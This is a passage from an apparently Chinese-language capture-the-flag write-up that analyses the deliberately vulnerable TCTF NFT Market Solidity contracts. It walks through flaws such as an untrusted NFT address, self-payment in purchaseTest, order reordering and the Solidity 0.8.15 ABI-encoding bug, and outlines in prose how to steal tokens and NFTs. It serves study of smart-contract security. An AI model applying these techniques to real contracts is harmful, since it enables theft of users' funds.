require(price &gt; 0, \"Invalid price\");\n        require(isNFTApprovedOrOwner(nftAddress, msg.sender, tokenId), \"Not owner\");\n        orders.push(Order(nftAddress, tokenId, price));\n        emit NFTListed(msg.sender, nftAddress, tokenId, price);\n        return orders.length - 1;\n    }\n\n    function cancelOrder(uint256 orderId) external {\n        Order memory order = getOrder(orderId);\n        require(isNFTApprovedOrOwner(order.nftAddress, msg.sender, order.tokenId), \"Not owner\");\n        _deleteOrder(orderId);\n        emit NFTCanceled(msg.sender, order.nftAddress, order.tokenId);\n    }\n\n    function purchaseOrder(uint256 orderId) external {\n        Order memory order = getOrder(orderId);\n        _deleteOrder(orderId);\n        IERC721 nft = IERC721(order.nftAddress);\n        address owner = nft.ownerOf(order.tokenId);\n        tctfToken.transferFrom(msg.sender, owner, order.price);\n        nft.safeTransferFrom(owner, msg.sender, order.tokenId);\n        emit NFTBought(msg.sender, order.nftAddress, order.tokenId, order.price);\n    }\n\n    function purchaseWithCoupon(SignedCoupon calldata scoupon) external {\n        Coupon memory coupon = scoupon.coupon;\n        require(coupon.user == msg.sender, \"Invalid user\");\n        require(coupon.newprice &gt; 0, \"Invalid price\");\n        verifier.verifyCoupon(scoupon);\n        Order memory order = getOrder(coupon.orderId);\n        _deleteOrder(coupon.orderId);\n        IERC721 nft = IERC721(order.nftAddress);\n        address owner = nft.ownerOf(order.tokenId);\n        tctfToken.transferFrom(coupon.user, owner, coupon.newprice);\n        nft.safeTransferFrom(owner, coupon.user, order.tokenId);\n        emit NFTBought(coupon.user, order.nftAddress, order.tokenId, coupon.newprice);\n    }\n\n    function purchaseTest(address nftAddress, uint256 tokenId, uint256 price) external {\n        require(!tested, \"Tested\");\n        tested = true;\n        IERC721 nft = IERC721(nftAddress);\n        uint256 orderId = TctfMarket(this).createOrder(nftAddress, tokenId, price);\n        nft.approve(address(this), tokenId);\n        TctfMarket(this).purchaseOrder(orderId);\n    }\n\n    function win() external {\n        require(tctfNFT.ownerOf(1) == msg.sender &amp;&amp; tctfNFT.ownerOf(2) == msg.sender &amp;&amp; tctfNFT.ownerOf(3) == msg.sender);\n        emit SendFlag();\n    }\n\n    function isNFTApprovedOrOwner(address nftAddress, address spender, uint256 tokenId) internal view returns (bool) {\n        IERC721 nft = IERC721(nftAddress);\n        address owner = nft.ownerOf(tokenId);\n        return (spender == owner || nft.isApprovedForAll(owner, spender) || nft.getApproved(tokenId) == spender);\n    }\n\n    function _deleteOrder(uint256 orderId) internal {\n        orders[orderId] = orders[orders.length - 1];\n        orders.pop();\n    }\n\n    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n}\n\ncontract CouponVerifierBeta {\n    TctfMarket market;\n    bool tested;\n\n    constructor() {\n        market = TctfMarket(msg.sender);\n    }\n\n    function verifyCoupon(SignedCoupon calldata scoupon) public {\n        require(!tested, \"Tested\");\n        tested = true;\n        Coupon memory coupon = scoupon.coupon;\n        Signature memory sig = scoupon.signature;\n        Order memory order = market.getOrder(coupon.orderId);\n        bytes memory serialized = abi.encode(\n            \"I, the issuer\", coupon.issuer,\n            \"offer a special discount for\", coupon.user,\n            \"to buy\", order, \"at\", coupon.newprice,\n            \"because\", coupon.reason\n        );\n        IERC721 nft = IERC721(order.nftAddress);\n        address owner = nft.ownerOf(order.tokenId);\n        require(coupon.issuer == owner, \"Invalid issuer\");\n        require(ecrecover(keccak256(serialized), sig.v, sig.rs[0], sig.rs[1]) == coupon.issuer, \"Invalid signature\");\n    }\n}\n</code></pre> <p>\u5408\u7ea6\u5f88\u590d\u6742\uff0c\u4e0b\u9762\u8be6\u7ec6\u5206\u6790\u4e00\u4e0b\uff1a</p> <ul> <li>\u6709\u4e00\u4e2a\u57fa\u4e8e ERC20 \u7684\u4ee3\u5e01 TctfToken\uff08TTK\uff09<ul> <li>\u5728\u521b\u5efa\u65f6\u4f1a\u7ed9\u81ea\u5df1\u5408\u7ea6\u53d1\u653e 100000000000 \u4e2a\u4ee3\u5e01\uff0c\u7ed9\u90e8\u7f72\u8005\u53d1\u653e 1337 \u4e2a\u4ee3\u5e01</li> <li>\u6709\u7a7a\u6295\u65b9\u6cd5\uff0c\u5916\u90e8\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528\uff0c\u4e0d\u8fc7\u53ea\u80fd\u8c03\u7528\u4e00\u6b21\uff0c\u4e14\u4e00\u6b21\u53ea\u80fd\u83b7\u5f97 5 \u4e2a\u4ee3\u5e01</li> </ul> </li> <li>\u6709\u4e00\u4e2a\u57fa\u4e8e ERC721 \u7684\u975e\u540c\u8d28\u5316\u4ee3\u5e01\uff08NFT\uff09TctfNFT<ul> <li>NFT \u7684\u5b9e\u8d28\u5c31\u662f\u53ef\u4ee5\u4e0b\u53d1\u5f88\u591a\u79cd\u4ee3\u5e01\uff08tokenId\uff09\uff0c\u4e0d\u8fc7\u6bcf\u79cd\u53ea\u80fd\u6709\u4e00\u4e2a\uff0c\u56e0\u6b64\u5728 mint \u7684\u65f6\u5019\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4ee3\u8868\u7684\u662f\u7f16\u53f7\u800c\u4e0d\u662f ERC20 \u4e2d\u7684\u6570\u91cf</li> <li>\u53ea\u6709 owner \u53ef\u4ee5\u4e0b\u53d1\u65b0\u4ee3\u5e01</li> </ul> </li> <li>\u6709\u4e00\u4e9b\u7ed3\u6784\u4f53<ul> <li>Order\uff1a\u4fdd\u5b58\u4e86\u8ba2\u5355\u4fe1\u606f\uff0c\u5305\u542b NFT \u5408\u7ea6\u5730\u5740\u3001\u552e\u5356\u7684\u4ee3\u5e01 id\u3001\u552e\u5356\u7684\u4ef7\u683c</li> <li>Coupon\uff1a\u4fdd\u5b58\u4e86\u4e00\u4e2a\u4f18\u60e0\u5238\uff0c\u5305\u542b\u4e86\u8ba2\u5355\u7f16\u53f7\u3001\u4f18\u60e0\u540e\u7684\u4ef7\u683c\u3001\u4e0b\u53d1\u4f18\u60e0\u5238\u7684\u8d26\u6237\u5730\u5740\u3001\u4f7f\u7528\u4f18\u60e0\u5238\u7684\u8d26\u6237\u5730\u5740\u3001\u4f18\u60e0\u7406\u7531<ul> <li>\u26a0\ufe0f \u8fd9\u91cc\u6709\u4e00\u4e2a\u53ef\u7591\u7684\u5730\u65b9\uff0c\u5b83\u4fdd\u5b58\u7684\u662f\u8ba2\u5355\u7f16\u53f7\u800c\u4e0d\u662f\u4ee3\u5e01\u7f16\u53f7\uff0c\u4f1a\u51fa\u73b0\u95ee\u9898</li> </ul> </li> <li>Signature\uff1a\u4fdd\u5b58\u4e86\u7b7e\u540d\u4fe1\u606f\uff08web3 \u7b7e\u540d\u5f97\u5230\u7684 v\u3001r\u3001s\uff09</li> <li>SignedCoupon\uff1a\u4fdd\u5b58\u4e86\u4e00\u4e2a\u4f18\u60e0\u5238\u548c\u5bf9\u5e94\u7684\u7b7e\u540d</li> </ul> </li> <li>\u6709\u4e00\u4e2a\u4ea4\u6613\u5546\u573a\u5408\u7ea6 TctfMarket<ul> <li>\u6784\u9020\u65b9\u6cd5\uff1a<ul> <li>\u5148\u521b\u5efa\u4e00\u4e2a TctfToken \u5408\u7ea6\u8d26\u6237\uff0c\u5e76\u5141\u8bb8\u5f53\u524d\u5546\u573a\u5408\u7ea6\u4efb\u610f\u4f7f\u7528\u6240\u62e5\u6709\u7684\u4ee3\u5e01<ul> <li>\u5f53\u524d\u5546\u573a\u56e0\u4e3a\u90e8\u7f72\u4e86\u5408\u7ea6\u4f1a\u88ab\u5206\u5230 1337 TTK</li> </ul> </li> <li>\u7136\u540e\u521b\u5efa\u4e00\u4e2a TctfNFT \u5408\u7ea6\u8d26\u6237\uff0c\u5e76\u4e0b\u53d1\u4e09\u4e2a NFT \u4ee3\u5e01\uff1a<ul> <li>1 \u53f7 NFT \u53d1\u653e\u7ed9 TctfNFT \u5408\u7ea6\u8d26\u6237</li> <li>2 \u53f7\u30013 \u53f7 NFT \u53d1\u653e\u7ed9\u5f53\u524d\u5546\u573a\u8d26\u6237</li> </ul> </li> <li>\u521b\u5efa\u4e00\u4e2a verifier\uff08\u540e\u9762\u518d\u5206\u6790\uff09</li> <li>\u521b\u5efa\u4e09\u4e2a\u8ba2\u5355\uff1a<ul> <li>1 \u53f7\u4ee3\u5e01\u4ee5 1 TTK \u7684\u4ef7\u683c\u552e\u5356\uff08airdrop \u4e4b\u540e\u53ef\u4ee5\u76f4\u63a5\u8d2d\u4e70\uff09</li> <li>2 \u53f7\u4ee3\u5e01\u4ee5 1337 TTK \u7684\u4ef7\u683c\u552e\u5356<ul> <li>\u26a0\ufe0f \u7ed3\u5408\u524d\u9762\u5546\u573a\u5f97\u5230\u4e86 1337 TTK \u7684\u6697\u793a\uff0c\u53ef\u4ee5\u77e5\u9053\u8fd9\u4e2a\u4ee3\u5e01\u9700\u8981\u5148\u9a97\u53d6\u5546\u573a\u7684\u94b1</li> </ul> </li> <li>3 \u53f7\u4ee3\u5e01\u4ee5 13333333337 TTK \u7684\u4ef7\u683c\u552e\u5356<ul> <li>\u26a0\ufe0f \u4ef7\u683c\u5f88\u9ad8\uff0c\u6240\u4ee5\u53ef\u4ee5\u731c\u5230\u9700\u8981\u4f7f\u7528\u4f18\u60e0\u5238\u6765\u964d\u4f4e\u4ef7\u683c</li> </ul> </li> </ul> </li> </ul> </li> <li>\u901a\u8fc7\u65b9\u6cd5\uff1a<ul> <li>win \u65b9\u6cd5\u4e2d\u5b9a\u4e49\uff08\u672b\u5c3e emit \u4e86 SendFlag \u4e8b\u4ef6\uff09</li> <li>\u68c0\u67e5\u8c03\u7528\u8005\u662f\u5426\u62e5\u6709\u5168\u90e8\u4e09\u4e2a\u4ee3\u5e01\uff0c\u5982\u679c\u6709\u5219\u6210\u529f</li> </ul> </li> <li>getOrder \u65b9\u6cd5\uff1a\u83b7\u53d6\u8ba2\u5355\uff0c\u4e0d\u5fc5\u591a\u8bf4</li> <li>createOrder \u65b9\u6cd5<ul> <li>\u63a5\u6536\u4e00\u4e2a NFT \u5408\u7ea6\u8d26\u6237\u5730\u5740\uff0c\u552e\u5356\u7684 tokenId \u548c\u4ef7\u683c</li> <li>\u521b\u5efa\u8ba2\u5355\u7684\u8d26\u6237\uff08\u5373\u8c03\u7528\u6b64\u65b9\u6cd5\u7684\u8d26\u6237\uff09\u5fc5\u987b\u662f\u6240\u552e\u5356\u4ee3\u5e01\u7684 owner\uff0c\u6216\u8005\u88ab\u6240\u6709\u8005\u8d4b\u4e88\u4e86\u7ba1\u7406\u6b64\u4ee3\u5e01\u7684\u6743\u9650\uff0c\u6216\u8005\u88ab\u6240\u6709\u8005\u8d4b\u4e88\u4e86\u7ba1\u7406\u4ed6\u6240\u6709\u4ee3\u5e01\u7684\u6743\u9650\uff08\u5728 isNFTApprovedOrOwner \u65b9\u6cd5\u4e2d\u68c0\u67e5\uff09</li> <li>\u26a0\ufe0f \u6b64\u5904\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u521b\u5efa\u8ba2\u5355\u7684 NFT \u5408\u7ea6\u5730\u5740\u5e76\u6ca1\u6709\u786c\u7f16\u7801\u4e3a\u5546\u573a\u521b\u5efa\u7684 NFT \u5730\u5740\uff0c\u800c\u662f\u53ef\u4ee5\u901a\u8fc7\u7528\u6237\u81ea\u884c\u8f93\u5165\uff0c\u4f1a\u6709\u95ee\u9898</li> <li>\u26a0\ufe0f \u6b64\u5904\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u662f external \u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u5916\u90e8\u7684\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6765\u521b\u5efa\u8ba2\u5355</li> </ul> </li> <li>cancelOrder \u65b9\u6cd5<ul> <li>\u548c createOrder \u65b9\u6cd5\u540c\u6837\u68c0\u67e5\u4e86\u6743\u9650</li> <li>\u8c03\u7528\u4e86 internal \u7684 _deleteOrder \u65b9\u6cd5\uff1a<ul> <li>\u5c06\u672b\u5c3e\u7684\u8ba2\u5355\u79fb\u52a8\u5230\u5f53\u524d\u8981\u5220\u9664\u7684\u4f4d\u7f6e\u7136\u540e\u5f39\u51fa\u672b\u5c3e\u8ba2\u5355</li> <li>\u26a0\ufe0f \u8fd9\u91cc\u4f1a\u5bfc\u81f4\u8ba2\u5355\u987a\u5e8f\u4e71\u5e8f\uff0c\u7ed3\u5408\u524d\u9762\u4f18\u60e0\u5238\u4fdd\u5b58\u7684\u662f\u8ba2\u5355\u7f16\u53f7\uff0c\u4f1a\u5bfc\u81f4\u4f18\u60e0\u5238\u5b9e\u9645\u4f5c\u7528\u4ee3\u5e01\u53d1\u751f\u53d8\u5316\uff0c\u662f\u4e2a\u5927\u95ee\u9898</li> </ul> </li> </ul> </li> <li>\u6709\u4e09\u79cd\u652f\u4ed8\u8ba2\u5355\uff08\u8d2d\u4e70\u4ee3\u5e01\uff09\u7684\u65b9\u6cd5\uff1a<ul> <li>purchaseOrder \u539f\u4ef7\u8d2d\u4e70\uff1a<ul> <li>\u53ef\u4ee5\u8c03\u7528\u65e0\u9650\u6b21</li> <li>\u76f4\u63a5\u652f\u4ed8\uff0c\u5148\u5220\u9664\u8ba2\u5355\u9632\u6b62\u91cd\u5165</li> <li>\u5148\u4ece\u8c03\u7528\u8005\uff08\u4e70\u5bb6\uff09\u8f6c order.price \u4e2a TTK \u7ed9\u4ee3\u5e01\u6240\u6709\u8005<ul> <li>\u26a0\ufe0f \u8fd9\u91cc\u4e5f\u6709\u95ee\u9898\uff0cToken \u7684\u63a5\u6536\u65b9\u53ea\u4f1a\u662f owner\uff0c\u800c\u4e0d\u4f1a\u662f\u5176\u5b83\u88ab approved \u7684\u8d26\u6237\uff08\u6bd4\u5982\u8ba2\u5355\u521b\u5efa\u8005\uff09</li> </ul> </li> <li>\u518d\u4ece\u4ee3\u5e01\u6240\u6709\u8005\u8f6c\u51fa\u8fd9\u4e2a\u4ee3\u5e01\uff08order.tokenId\uff09\u7ed9\u8c03\u7528\u8005\uff08\u4e70\u5bb6\uff09</li> </ul> </li> <li>purchaseTest\uff1a<ul> <li>\u53ea\u80fd\u8c03\u7528\u4e00\u6b21</li> <li>\u26a0\ufe0f \u770b\u540d\u5b57\u662f\u6d4b\u8bd5\u7528\u65b9\u6cd5\uff0c\u5f88\u53ef\u7591\uff0c\u5e94\u8be5\u4f1a\u5305\u542b\u6f0f\u6d1e</li> <li>\u5177\u4f53\u903b\u8f91\u548c purchaseOrder \u5dee\u4e0d\u591a</li> <li>\u8c03\u7528\u8005\u53ef\u4ee5\u6307\u5b9a NFT \u5408\u7ea6\u5730\u5740\u3001tokenId \u548c\u4ef7\u683c</li> <li>\u5148\u521b\u5efa\u8ba2\u5355\u7136\u540e\u8df3\u7528 purchaseOrder \u8d2d\u4e70</li> </ul> </li> <li>purchaseWithCoupon \u4f7f\u7528\u4f18\u60e0\u5238\u8d2d\u4e70\uff1a<ul> <li>\u53ea\u80fd\u8c03\u7528\u4e00\u6b21\uff08CouponVerifierBeta \u7684\u539f\u56e0\uff09</li> <li>\u4f20\u5165\u4e00\u4e2a SignedCoupon</li> <li>\u901a\u8fc7 verifier.verifyCoupon \u9a8c\u8bc1\u6743\u9650\u548c\u7b7e\u540d</li> <li>\u901a\u8fc7 coupon.orderId \u53d6\u51fa\u8ba2\u5355\u5e76\u5220\u9664<ul> <li>\u26a0\ufe0f \u8fd9\u91cc\u6709\u95ee\u9898\uff0c\u53d6\u51fa\u8ba2\u5355\u7684\u64cd\u4f5c\u5728\u9a8c\u8bc1\u4e4b\u540e\uff0c\u5982\u679c\u80fd\u591f\u5728\u9a8c\u8bc1\u65f6\u641e\u4e9b\u624b\u6bb5\u5219\u53ef\u4ee5\u8ba9\u540e\u9762\u83b7\u5f97\u7684\u8ba2\u5355\u662f\u53e6\u4e00\u4e2a\u8ba2\u5355</li> </ul> </li> <li>\u4ee5 purchaseOrder \u540c\u6837\u903b\u8f91\u552e\u5356\uff08\u4ee5 coupon.newprice \u4ef7\u683c\uff09</li> </ul> </li> </ul> </li> <li>onERC721Received \u65b9\u6cd5\uff1a<ul> <li>\u9700\u8981\u8fd4\u56de selector \u6765\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u53ef\u7591\u63a5\u6536 ERC721 \u4ee3\u5e01\u7684\u5408\u7ea6\u8d26\u6237\uff08\u5728 safeTransferFrom \u65f6\u8c03\u7528\u68c0\u67e5\uff09</li> <li>\u66fe\u7ecf\u6709\u6f0f\u6d1e\u662f\u5229\u7528\u8fd9\u4e2a\u51fd\u6570\u7684\u7279\u6027\u6765\u5728\u91cc\u9762\u641e\u5c0f\u52a8\u4f5c\u5b9e\u73b0\u91cd\u5165\u653b\u51fb\uff0c\u4e0d\u8fc7\u672c\u5408\u7ea6\u5df2\u7ecf\u9632\u6b62\u4e86\u91cd\u5165</li> </ul> </li> </ul> </li> <li>\u6709\u4e00\u4e2a\u4f18\u60e0\u5238\u7b7e\u540d\u9a8c\u8bc1\u5408\u7ea6 CouponVerifierBeta\uff1a<ul> <li>\u26a0\ufe0f \u540c\u6837\u540d\u5b57\u91cc\u5e26\u4e86 Beta\uff0c\u5f88\u53ef\u7591</li> <li>verifyCoupon \u65b9\u6cd5\uff1a<ul> <li>\u53ea\u80fd\u8c03\u7528\u4e00\u6b21</li> <li>\u63a5\u6536\u4e00\u4e2a SignedCoupon</li> <li>\u53d6\u51fa coupon\u3001\u7b7e\u540d\u3001\u8ba2\u5355</li> <li>\u6784\u9020 serialized bytes \u4fe1\u606f</li> <li>\u9a8c\u8bc1 issuer \u662f\u5426\u662f\u6240\u4f18\u60e0\u7684\u4ee3\u5e01\u7684 owner<ul> <li>\u26a0\ufe0f \u6b64\u5904\u6709\u95ee\u9898\uff0c\u8c03\u7528\u4e86 NFT \u5730\u5740\u4e0a\u7684 ownerOf \u65b9\u6cd5\uff0c\u4e0d\u8fc7\u8fd9\u4e2a NFT \u5730\u5740\u53ef\u4ee5\u662f\u7528\u6237\u81ea\u884c\u521b\u5efa\u8ba2\u5355\u65f6\u6307\u5b9a\u7684\uff0c\u5176 ownerOf \u65b9\u6cd5\u4e5f\u5e76\u4e0d\u53ef\u4fe1</li> </ul> </li> <li>\u9a8c\u8bc1\u9488\u5bf9 keccak256(serialized) \u7684\u7b7e\u540d sig \u662f\u5426\u662f issuer \u7b7e\u7f72\u7684</li> </ul> </li> </ul> </li> </ul> <p>\u5206\u6790\u4e0b\u6765\u5df2\u7ecf\u5f97\u5230\u4e86\u5f88\u591a\u7591\u70b9\u548c\u6709\u6f0f\u6d1e\u7684\u5730\u65b9\uff0c\u4e09\u4e2a\u4ee3\u5e01\u7684\u83b7\u53d6\u65b9\u6cd5\u4e5f\u5c31\u57fa\u672c\u6e05\u6670\u4e86\uff1a</p> <ul> <li>1 \u53f7\u4ee3\u5e01\u901a\u8fc7 airdrop \u62ff\u5230 5 TTK \u540e\u53ef\u4ee5\u76f4\u63a5\u8d2d\u4e70</li> <li>2 \u53f7\u4ee3\u5e01\u901a\u8fc7 purchaseTest \u65b9\u6cd5\u7684\u6f0f\u6d1e\u9a97\u53d6 1337 TTK \u540e\u8d2d\u4e70<ul> <li>\u5148\u521b\u5efa\u4e00\u4e2a\u81ea\u5df1\u7684 TctfNFT \u5408\u7ea6</li> <li>\u7ed9\u81ea\u5df1\u53d1\u653e\u4e00\u4e2a\u4ee3\u5e01</li> <li>\u5c06\u81ea\u5df1\u7684\u6743\u9650\u5168\u6743\u4ee3\u7406\u7ed9\u5546\u573a</li> <li>\u8c03\u7528 puchaseTest \u65b9\u6cd5\uff0c\u4f20\u5165\u81ea\u5df1\u5efa\u7684 NFT \u5408\u7ea6\u5730\u5740\u3001\u53d1\u653e\u7684\u4ee3\u5e01\u7f16\u53f7\u30011337 TTK \u7684\u4ef7\u683c<ul> <li>\u8fd9\u65f6\u91cc\u9762\u4f1a\u521b\u5efa\u8fd9\u4e2a\u8ba2\u5355\u5e76\u4e14\u81ea\u5df1\u8d2d\u4e70</li> <li>\u4e0d\u8fc7\u81ea\u5df1\u8d2d\u4e70\u65f6\u6536\u6b3e\u65b9\u5e76\u4e0d\u662f\u81ea\u5df1\uff0c\u800c\u662f\u8fd9\u4e2a\u4ee3\u5e01\u7684 owner\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u7684\u8d26\u6237\uff0c\u6240\u4ee5\u5c31\u9a97\u5230\u4e86 1337 TTK</li> </ul> </li> <li>\uff08\u4e0d\u901a\u8fc7\u5df2\u4e70\u7684 1 \u53f7\u4ee3\u5e01\u9a97\u94b1\u7684\u539f\u56e0\u662f\u8fd9\u6837\u4f1a\u5bfc\u81f4 1 \u53f7\u4ee3\u5e01\u65e0\u6cd5\u518d\u56de\u6536\uff09</li> </ul> </li> <li>3 \u53f7\u4ee3\u5e01\u901a\u8fc7 CouponVerifierBeta \u7684\u6f0f\u6d1e\uff0c\u5728 ownerOf \u91cc\u8c03\u7528\u5220\u9664\u8ba2\u5355\u4f7f\u8ba2\u5355\u961f\u5217\u4e71\u5e8f\uff0c\u4ece\u800c\u7528\u6b63\u786e\u7684\u4f18\u60e0\u5238\u548c\u4ef7\u683c\u4e70\u5230\u5176\u5b83\u8ba2\u5355\u4e2d\u7684\u4ee3\u5e01</li> </ul> <p>1\u30012 \u53f7\u83b7\u53d6\u7684\u6d41\u7a0b\u5df2\u7ecf\u5f88\u6e05\u6670\u4e86\uff0c\u800c\u4e14\u5176\u987a\u5e8f\u5e76\u4e0d\u5f71\u54cd\uff0c\u53ef\u4ee5\u968f\u65f6\u901a\u8fc7\u5bf9\u5e94\u65b9\u6cd5\u83b7\u5f97\u3002\u4e0b\u9762\u4e3b\u8981\u8bf4 3 \u53f7\u4ee3\u5e01\uff0c\u4e5f\u5c31\u662f\u6700\u7cbe\u5f69\u7684\u90e8\u5206\uff1a</p> <p>\u8fd9\u4e2a\u4ee3\u5e01\u7684\u83b7\u53d6\u65b9\u6cd5\u80af\u5b9a\u662f\u901a\u8fc7 purchaseWithCoupon \u65b9\u6cd5\uff0c\u518d\u634b\u4e00\u4e0b\u8c03\u7528\u7684\u6574\u4e2a\u8fc7\u7a0b\uff1a</p> <ol> <li>\u53d6\u51fa\u53c2\u6570\u4e2d\u7684 coupon</li> <li>\u9a8c\u8bc1 user\uff08\u4f7f\u7528\u8005\uff09\u662f\u5426\u662f\u8c03\u7528\u8005\uff0cnewprice \u662f\u5426\u5927\u4e8e 0</li> <li>\u8c03\u7528 verifier.verifyCoupon \u65b9\u6cd5<ol> <li>\u53d6\u51fa coupon\u3001sig\u3001order\uff08\u8ba2\u5355\u5168\u90e8\u5185\u5bb9\uff09</li> <li>\u6784\u9020\u5e8f\u5217\u5316\u4fe1\u606f</li> <li>\u8c03\u7528 order.nftAddress \u4e0a\u7684 ownerOf \u65b9\u6cd5\u83b7\u5f97 owner</li> <li>\u9a8c\u8bc1 issuer\uff08\u4e0b\u53d1\u4f18\u60e0\u5238\u7684\u4eba\uff09\u662f\u5426\u662f owner</li> <li>\u9a8c\u8bc1\u7b7e\u540d\u662f\u5426\u662f issuer \u4e3a\u5e8f\u5217\u5316\u4fe1\u606f\u7b7e\u7f72\u7684</li> </ol> </li> <li>\u6839\u636e coupon.orderId \u53d6\u51fa\u5e76\u5220\u9664\u8ba2\u5355</li> <li>\u8c03\u7528 order.nftAddress \u4e0a\u7684 ownerOf \u65b9\u6cd5\u83b7\u5f97 owner</li> <li>coupon.user \u5411 owner \u8f6c coupon.newprice \u4e2a TTK</li> <li>owner \u5c06 order.tokenId \u8fd9\u4e2a\u4ee3\u5e01\u8f6c\u7ed9 coupon.user</li> </ol> <p>\u5176\u4e2d coupon \u63d0\u53d6\u7684\u65f6\u673a\u5f88\u5173\u952e\uff1a</p> <ul> <li>\u5728 purchaseWithCoupon \u65b9\u6cd5\u5f00\u5934\u5c31\u63d0\u53d6\u4e86 coupon \u5168\u90e8\u5185\u5bb9\u5230\u5185\u5b58\u4e2d\uff0c\u56e0\u6b64 verifier.verifyCoupon \u8fd4\u56de\u540e coupon.orderId\u3001coupon.user \u4e0d\u4f1a\u53d8</li> <li>\u5728 verifier.verifyCoupon \u65b9\u6cd5\u4e2d\u4e5f\u662f\u5f00\u5934\u5c31\u63d0\u53d6\u4e86 coupon \u5168\u90e8\u5185\u5bb9\uff0c\u5e76\u5728 ownerOf \u8c03\u7528\u524d\u5c31\u521b\u5efa\u4e86\u5bf9\u5e94\u7684\u5e8f\u5217\u5316\u4fe1\u606f</li> </ul> \u9519\u8bef\u7684\u65b9\u6cd5 <p>\u6240\u4ee5\u53ea\u8981\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u81ea\u5df1\u7684\u8ba2\u5355\uff08nftAddress \u662f\u81ea\u5df1\u90e8\u7f72\u7684\u6709\u95ee\u9898\u7684\u5408\u7ea6\uff09\uff0c\u901a\u8fc7\u67d0\u4e9b\u65b9\u6cd5\u8ba9\u5176\u987a\u5e8f\u53d8\u5230 3 \u53f7\u4ee3\u5e01\u5bf9\u5e94\u8ba2\u5355\u4e4b\u524d\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u5728 verifier.verifyCoupon \u65b9\u6cd5\u4e2d\u8c03\u7528 ownerOf \u65f6\u5728\u5176\u5185\u90e8\u5220\u9664\u6389\u8fd9\u4e2a\u8ba2\u5355\uff0c\u5bfc\u81f4\u540e\u9762\u901a\u8fc7 getOrder(coupon.orderId).tokenId \u83b7\u53d6\u5230\u7684\u5b9e\u9645\u4e0a\u662f 3 \u53f7\u4ee3\u5e01</p> <p>\u8fd9\u6837\u56de\u5230 purchaseWithCoupon \u65b9\u6cd5\u4e4b\u540e\u53d6\u51fa\u4e86\u8ba2\u5355\uff08\u552e\u5356\u7684 tokenId \u662f 3\uff0cnftAddress \u4e5f\u662f\u5546\u573a\u4e2d\u7684 NFT \u5730\u5740\uff09\u4ed8\u6b3e\u53ea\u9700\u4ed8 coupon.newprice \u8fd9\u4e48\u591a\u5c31\u53ef\u4ee5\u5f97\u5230 3 \u53f7\u4ee3\u5e01\u3002</p> <p>\u4e71\u5e8f\u7684\u65b9\u6cd5\u662f\uff1a</p> <ul> <li>\u8d77\u59cb\uff1a1 2 3</li> <li>\u589e\u52a0\u4e00\u4e2a\u81ea\u5df1\u7684\uff1a1 2 3 4</li> <li>\u4e70\u4e0b 2\uff1a1 4 3\uff08\u6b64\u65f6\u81ea\u5df1\u7684\u8ba2\u5355\u5728 3 \u524d\uff09</li> </ul> <p>\u4e0d\u8fc7\u4e0a\u9762\u8fd9\u4e2a\u65b9\u6cd5\u662f\u6709\u95ee\u9898\u7684\uff0c\u4fee\u6539 ownerOf \u5728\u5176\u4e2d\u5220\u9664\u8ba2\u5355\u7684\u8bdd\u4f1a\u5bfc\u81f4\u8fd9\u4e2a\u65b9\u6cd5\u5e76\u4e0d\u662f view \u65b9\u6cd5\uff0c\u9700\u8981\u4f7f\u7528 call \u800c\u4e0d\u662f staticcall \u8c03\u7528\u3002\u4f46\u662f\u901a\u8fc7 IERC721 \u5f97\u5230\u7684\u63a5\u53e3\u662f view \u7684\uff0c\u4f1a\u4f7f\u7528 staticcall \u8c03\u7528\uff0c\u4ece\u800c\u5bfc\u81f4 revert</p> <p>\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u5173\u952e\u5728\u4e8e\u9898\u76ee\u6307\u5b9a\u4e86 solidity \u7f16\u8bd1\u5668\u7248\u672c\u4e3a 0.8.15\u3002\u8fd9\u4e2a\u7248\u672c\u7684\u7f16\u8bd1\u5668\u5b58\u5728\u4e00\u4e2a bug\u3002\u6765\u81ea solidity 0.8.16 release post\uff1a</p> <p>Important Bugfixes:</p> <ul> <li>Code Generation: Fix data corruption that affected ABI-encoding of calldata values represented by tuples: structs at any nesting level; argument lists of external functions, events and errors; return value lists of external functions. The 32 leading bytes of the first dynamically-encoded value in the tuple would get zeroed when the last component contained a statically-encoded array.</li> </ul> <p>\u6362\u53e5\u8bdd\u8bf4\u5c31\u662f\u5728\u8c03\u7528 verifyCoupon \u65b9\u6cd5\u65f6\u5176\u63a5\u6536\u5230\u7684 scoupon \u7684\u524d 32 \u5b57\u8282\u4f1a\u53d8\u6210\u5168 0\uff0c\u800c\u5bf9\u5e94\u7ed3\u6784\u4f53\u4e2d\u8fd9\u4e2a\u4f4d\u7f6e\u521a\u597d\u662f orderId\uff0c\u8fd9\u5c31\u5bfc\u81f4\u4e86\u65e0\u8bba\u5982\u4f55 verifyCoupon \u7684\u59cb\u7ec8\u662f\u7b2c\u4e00\u4e2a\u8ba2\u5355\u4e0a\u7684\u4fe1\u606f\u3002\u56e0\u6b64\u6211\u4eec\u8ba2\u5355\u5217\u8868\u7684\u987a\u5e8f\u5c31\u53ef\u4ee5\u662f\uff1a</p> <ul> <li>\u521d\u59cb\uff1a1 2 3</li> <li>\u65b0\u5efa\uff1a1 2 3 4</li> <li>\u4e70\u4e0b 1\uff1a4 2 3</li> <li>\u4e70\u4e0b 2: 4 3</li> </ul> <p>\u6240\u4ee5\u6700\u7ec8\u9a8c\u8bc1\u7684\u8fd8\u662f\u6211\u4eec\u81ea\u5df1\u8ba2\u5355\u4e0a\u7684\u4fe1\u606f\uff0c\u800c owner 